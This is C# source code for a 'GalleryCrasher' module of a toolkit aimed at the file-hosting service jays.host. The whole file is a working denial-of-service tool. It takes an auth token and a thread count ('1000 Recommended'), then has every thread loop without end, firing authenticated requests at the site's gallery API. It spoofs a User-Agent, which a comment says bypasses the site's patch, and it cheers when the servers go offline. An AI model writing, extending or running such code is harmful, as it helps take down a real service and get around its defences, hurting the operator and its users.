using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using Newtonsoft.Json;
using static Colorful.Console;

namespace Jays.Host_Toolkit.Tools.Crashers
{
    public static class GalleryCrasher
    {
        private static string _token;
        private static int _requestsSent;
        
        public static void Start()
        {
            tryAgain:
            try
            {
                Title = "Jays.Host Toolkit | Made by Verity | Version 1.0, Build 01/20/22 | Current Tool: Method 4";
            
                Utils.LoadingSequence();
            
                WriteLine(" Token:", Color.DodgerBlue);
                Write(" --> ", Color.DarkSlateBlue); 
                _token = ReadLine();
                
                Console.WriteLine("");
                
                WriteLine(" Threads [1000 Recommended]:", Color.DodgerBlue);
                Write(" --> ", Color.DarkSlateBlue);
                var threads = ReadLine();

                Clear();
                
                Utils.LoadingSequence();
                
                var convertThreads = Convert.ToInt32(threads);
                for (var i = 0; i < convertThreads; i++)
                {
                    new Thread(Crasher).Start();
                }
                Console.ReadLine();
            }
            catch (FormatException)
            {
                Console.WriteLine("\n Error, please enter the NUMBER of threads, its an integer not a string.");
                Console.ReadKey();
                Console.Clear();
                goto tryAgain;
            }
        }

        private static async void Crasher()
        {
            var random = new Random();
            string[] options = {"all", "image", "video", "audio", "text", "paste", "binary" };
            while (true)
            {
                try
                {
                    Title = "Jays.Host Toolkit | Made by Verity | Version 1.0, Build 01/20/22 | Current Tool: Method 4 | Requests Sent: " + _requestsSent;
                    var sex = random.Next(0, 7);
                    var galleryEndpoint = WebRequest.Create($"https://jays.host/api/v1/gallery/personal/1?filter={options[sex]}&search=");
                    galleryEndpoint.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win69; x64; rv:47.0) Gecko/20100101 Firefox/47.0"); // Bypass Jays awesome patch.
                    galleryEndpoint.Headers.Add("Authorization", _token);
                    galleryEndpoint.Method = WebRequestMethods.Http.Get;
                    var responseMessage = (HttpWebResponse)await galleryEndpoint.GetResponseAsync();
                    var streamReader = new StreamReader(responseMessage.GetResponseStream());
                    JsonConvert.DeserializeObject(await streamReader.ReadToEndAsync());
                    var contentString = responseMessage.StatusCode;
                    WriteLine(contentString == HttpStatusCode.OK ? " #" + _requestsSent + " Requests Sent." : " Request failed to send (Jays.Host is most likely down).", Color.Green);
                    _requestsSent += 1;
                }
                catch (WebException e)
                {
                    if (e.Status == WebExceptionStatus.UnknownError)
                    {
                        WriteLine(" Servers Offline :)", Color.Green);
                    }
                    else
                    {
                        WriteLine(" Servers unreachable :) -> " + e.Message, Color.Green);
                    }
                    _requestsSent += 1;
                }
                Thread.Sleep(100);
            }
        }
    }
}